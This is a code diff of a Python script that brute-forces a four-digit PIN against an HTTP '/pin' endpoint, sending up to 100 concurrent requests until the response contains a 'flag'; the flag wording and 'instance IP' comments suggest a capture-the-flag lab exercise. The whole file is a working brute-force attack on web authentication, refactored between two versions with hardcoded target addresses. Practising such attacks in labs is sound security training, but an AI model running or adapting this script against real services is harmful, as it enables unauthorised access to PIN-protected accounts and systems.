@@ -1,55 +1,45 @@
 import asyncio
 import aiohttp
 
-# Server information
-ip = "94.237.54.42"  # Replace with your server IP address
-port = 32157         # Replace with your server port number
+ip = "94.237.59.180"  # Replace with your instance IP address
+port = 44434          # Replace with your instance port number
 url = f"http://{ip}:{port}/pin"
 
 async def try_pin(session, pin):
-    """
-    Attempt a single PIN by sending a GET request.
-    """
-    formatted_pin = f"{pin:04d}"  # Format the PIN as a 4-digit string
+    formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string
     async with session.get(f"{url}?pin={formatted_pin}") as response:
-        if response.status == 200:  # Check for a successful response
-            json_data = await response.json()
-            if 'flag' in json_data:  # Check if the response contains the flag
-                print(f"✅ Correct PIN found: {formatted_pin}")
-                print(f"🏴 Flag: {json_data['flag']}")
+        if response.status == 200:  # Check if the response is successful
+            data = await response.json()
+            if 'flag' in data:  # Check if the flag is in the response
+                print(f"Correct PIN found: {formatted_pin}")
+                print(f"Flag: {data['flag']}")
                 return True
     return False
 
 async def main():
-    """
-    Main function to orchestrate the PIN brute force attack.
-    """
-    print("🔄 Starting PIN brute-force attack...")
+    tasks = []
+    semaphore = asyncio.Semaphore(100)  # Limit to 100 concurrent requests
 
     async with aiohttp.ClientSession() as session:
-        # Limit the number of concurrent requests to avoid overwhelming the server
-        semaphore = asyncio.Semaphore(100)
-        tasks = []
+        for pin in range(10000):
+            await semaphore.acquire()
 
-        async def task_wrapper(pin):
-            async with semaphore:
-                success = await try_pin(session, pin)
-                if success:
-                    for task in tasks:
-                        task.cancel()  # Cancel remaining tasks
-                    return True
+            async def task_wrapper(pin=pin):
+                try:
+                    success = await try_pin(session, pin)
+                    if success:
+                        for t in tasks:  # Cancel remaining tasks if PIN is found
+                            t.cancel()
+                finally:
+                    semaphore.release()
 
-        # Create asynchronous tasks for each PIN
-        for pin in range(10000):  # 4-digit PIN range: 0000 to 9999
-            tasks.append(asyncio.create_task(task_wrapper(pin)))
+            tasks.append(asyncio.create_task(task_wrapper()))
 
-        # Wait for all tasks to complete or be canceled
+        # Wait for all tasks to complete
         try:
             await asyncio.gather(*tasks)
         except asyncio.CancelledError:
             pass
 
-if __name__ == "__main__":
-    print("🚀 Starting PIN brute-force attack...")
-    asyncio.run(main())
-    print("🎯 Attack completed.")
+# Run the script
+asyncio.run(main())
